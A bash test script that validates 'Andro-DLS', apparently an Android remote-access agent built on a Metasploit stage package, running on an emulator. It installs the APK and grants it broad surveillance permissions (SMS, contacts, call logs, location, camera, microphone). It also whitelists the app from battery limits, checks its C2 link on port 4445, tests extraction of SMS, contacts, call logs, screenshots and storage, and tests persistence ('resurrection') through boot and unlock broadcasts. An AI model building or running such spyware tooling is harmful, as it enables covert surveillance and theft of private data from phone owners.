#!/usr/bin/env bash
# test_emulator.sh — Full Andro-DLS agent test on emulator
set -euo pipefail

REPO="$(cd "$(dirname "$0")" && pwd)"
APK="$REPO/androdls-emulator.apk"
PKG="com.metasploit.stage"
SDK="/home/div-admin/Android/Sdk"
EMULATOR="$SDK/emulator/emulator"
AVD="AndroDLS-Test"
C2_PORT=4445
C2_HOST="127.0.0.1"

log() { echo "[$(date +%H:%M:%S)] $*"; }
adb_run() { adb shell "$@" 2>/dev/null; }

# ---------------------------------------------------------------------------
# 1. Start emulator with retries
# ---------------------------------------------------------------------------
start_emulator() {
    pkill -f "emulator.*$AVD" 2>/dev/null || true
    sleep 3
    log "Starting emulator: $AVD (gpu off, no window)"
    "$EMULATOR" -avd "$AVD" -no-snapshot -no-window -no-audio -gpu off \
        -no-boot-anim -memory 2048 &>/tmp/emulator-test.log &
    log "Waiting for boot (up to 3 min)..."
    if adb wait-for-device shell 'while [[ -z $(getprop sys.boot_completed) ]]; do sleep 1; done; echo BOOTED' 2>/dev/null; then
        log "Emulator booted ✓"
        return 0
    fi
    log "Boot timed out"
    return 1
}

# Retry loop
for attempt in 1 2 3; do
    start_emulator && break
    log "Attempt $attempt failed, retrying..."
    sleep 5
done

# Verify connection
if ! adb devices | grep -q "emulator-5554.*device"; then
    log "FATAL: Emulator not connected after 3 attempts"
    cat /tmp/emulator-test.log | tail -20
    exit 1
fi

# ---------------------------------------------------------------------------
# 2. Device info
# ---------------------------------------------------------------------------
log "=== DEVICE INFO ==="
adb shell "getprop ro.product.model && getprop ro.build.version.release && getprop ro.build.version.sdk && getprop ro.product.cpu.abi"

# ---------------------------------------------------------------------------
# 3. Install APK
# ---------------------------------------------------------------------------
log "=== INSTALLING APK ==="
adb install -r "$APK" 2>&1 || { log "Install failed"; exit 1; }
log "APK installed ✓"

# ---------------------------------------------------------------------------
# 4. Grant permissions
# ---------------------------------------------------------------------------
log "=== GRANTING PERMISSIONS ==="
PERMS=(READ_SMS SEND_SMS READ_CONTACTS READ_CALL_LOG ACCESS_FINE_LOCATION
       ACCESS_COARSE_LOCATION ACCESS_BACKGROUND_LOCATION CAMERA RECORD_AUDIO
       READ_PHONE_STATE POST_NOTIFICATIONS)
GRANTED=0
for p in "${PERMS[@]}"; do
    adb shell pm grant "$PKG" "android.permission.$p" 2>/dev/null && GRANTED=$((GRANTED+1))
done
log "Granted: $GRANTED/${#PERMS[@]}"

# ---------------------------------------------------------------------------
# 5. Battery whitelist
# ---------------------------------------------------------------------------
log "=== BATTERY WHITELIST ==="
adb shell dumpsys deviceidle whitelist +"$PKG" 2>/dev/null && log "Whitelisted ✓" || log "Whitelist N/A"

# ---------------------------------------------------------------------------
# 6. Launch agent
# ---------------------------------------------------------------------------
log "=== LAUNCHING AGENT ==="
adb shell am startservice -n "$PKG/.MainService" 2>&1 || true
adb shell am start -n "$PKG/.MainActivity" 2>&1 || true
sleep 2

# ---------------------------------------------------------------------------
# 7. Verify process
# ---------------------------------------------------------------------------
log "=== PROCESS CHECK ==="
adb shell "ps -A | grep -i meta" 2>&1 || adb shell "ps | grep -i meta" 2>&1 || log "Process not found yet (may need more time)"

# ---------------------------------------------------------------------------
# 8. Package info
# ---------------------------------------------------------------------------
log "=== PACKAGE INFO ==="
adb shell "pm list packages | grep meta" 2>&1
adb shell "pm path $PKG" 2>&1

# ---------------------------------------------------------------------------
# 9. Permissions dump
# ---------------------------------------------------------------------------
log "=== PERMISSIONS GRANTED ==="
adb shell "dumpsys package $PKG | grep 'android.permission' | grep 'granted=true' | head -15" 2>&1

# ---------------------------------------------------------------------------
# 10. Check foreground service notification
# ---------------------------------------------------------------------------
log "=== FOREGROUND SERVICE CHECK ==="
adb shell "dumpsys activity services $PKG" 2>&1 | head -30

# ---------------------------------------------------------------------------
# 11. Logcat for agent
# ---------------------------------------------------------------------------
log "=== LOGCAT (last 30 lines) ==="
adb shell "logcat -d | grep -iE 'meta|Agent|Dls|SysUpd|DlsService|DlsLauncher' | tail -30" 2>&1

# ---------------------------------------------------------------------------
# 12. Start C2 listener and test connection
# ---------------------------------------------------------------------------
log "=== C2 CONNECTION TEST ==="

# Check if agent is trying to connect (netstat)
adb shell "netstat -an 2>/dev/null || ss -an 2>/dev/null" | grep -i "4445\|10.0.2.2" || log "No active C2 connection visible"

# Test: can the emulator reach the host?
log "=== NETWORK REACHABILITY ==="
adb shell "ping -c 1 10.0.2.2" 2>&1 | head -3 || log "ping blocked (normal)"

# ---------------------------------------------------------------------------
# 13. Test shell commands (agent vs adb)
# ---------------------------------------------------------------------------
log "=== ADB SHELL TESTS ==="

# Basic commands
log "Testing: id"
adb shell "id" 2>&1 | head -3

log "Testing: getprop ro.product.model"
adb shell "getprop ro.product.model" 2>&1

log "Testing: ls /data/local/tmp"
adb shell "ls /data/local/tmp" 2>&1 | head -5

# ---------------------------------------------------------------------------
# 14. Test data access capabilities
# ---------------------------------------------------------------------------
log "=== DATA ACCESS TESTS ==="

# SMS
log "Testing: SMS access"
adb shell "content query --uri content://sms --projection _id,address,body --limit 5" 2>&1 | head -5 || log "  No SMS on emulator (expected)"

# Contacts
log "Testing: Contacts access"
adb shell "content query --uri content://contacts/phones --projection display_name,number --limit 5" 2>&1 | head -3 || log "  No contacts on emulator (expected)"

# Call logs
log "Testing: Call log access"
adb shell "content query --uri content://call_log/calls --projection number,type --limit 5" 2>&1 | head -3 || log "  No call logs on emulator (expected)"

# Camera
log "Testing: Camera check"
adb shell "ls /dev/video*" 2>&1 || log "  No camera device (emulator)"

# Audio
log "Testing: Audio check"
adb shell "ls /dev/snd/* 2>/dev/null || echo no-audio-devices" 2>&1 | head -3

# Location
log "Testing: Location"
adb shell "dumpsys location | grep -i 'last location' | head -3" 2>&1 || log "  Location unavailable"

# Screenshot
log "Testing: Screenshot"
adb shell "screencap -p /data/local/tmp/test.png && ls -la /data/local/tmp/test.png" 2>&1

# Installed apps
log "Testing: List 3rd-party apps"
adb shell "pm list packages -3" 2>&1

# Storage
log "Testing: Storage"
adb shell "ls /sdcard/ 2>/dev/null | head -10" 2>&1

# ---------------------------------------------------------------------------
# 15. Resurrection test
# ---------------------------------------------------------------------------
log "=== RESURRECTION TEST ==="
log "Force-stopping service..."
adb shell "am force-stop $PKG" 2>&1
sleep 3
log "Checking if service auto-restarts..."
adb shell "ps -A | grep -i meta" 2>&1 || log "  Not running (expected — service killed)"

log "Sending BOOT_COMPLETED broadcast..."
adb shell "am broadcast -a android.intent.action.BOOT_COMPLETED -p $PKG" 2>&1
sleep 3
adb shell "ps -A | grep -i meta" 2>&1 || log "  Not running after BOOT_COMPLETED"

log "Sending USER_PRESENT broadcast..."
adb shell "am broadcast -a android.intent.action.USER_PRESENT -p $PKG" 2>&1
sleep 3
adb shell "ps -A | grep -i meta" 2>&1 || log "  Not running after USER_PRESENT"

# ---------------------------------------------------------------------------
# 16. Reconnection test
# ---------------------------------------------------------------------------
log "=== RECONNECTION TEST ==="
log "Killing all ADB connections..."
adb disconnect 2>/dev/null || true
sleep 2
log "Reconnecting..."
adb connect 127.0.0.1:5555 2>/dev/null || true
adb devices 2>&1 | head -5

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo ""
echo "================================================================"
echo "  TEST REPORT SUMMARY"
echo "================================================================"
echo ""
echo "Device:    $(adb shell getprop ro.product.model 2>/dev/null || echo 'unknown')"
echo "Android:   $(adb shell getprop ro.build.version.release 2>/dev/null || echo 'unknown')"
echo "API:       $(adb shell getprop ro.build.version.sdk 2>/dev/null || echo 'unknown')"
echo "Arch:      $(adb shell getprop ro.product.cpu.abi 2>/dev/null || echo 'unknown')"
echo "Package:   $(adb shell pm path $PKG 2>/dev/null || echo 'not installed')"
echo "Perms:     $GRANTED/${#PERMS[@]} granted"
echo ""
echo "Logcat for review: adb shell logcat -d | grep -iE 'meta|Agent|Dls'"
echo "C2 listener:       python3 payload/c2_server.py (in another terminal)"
echo ""
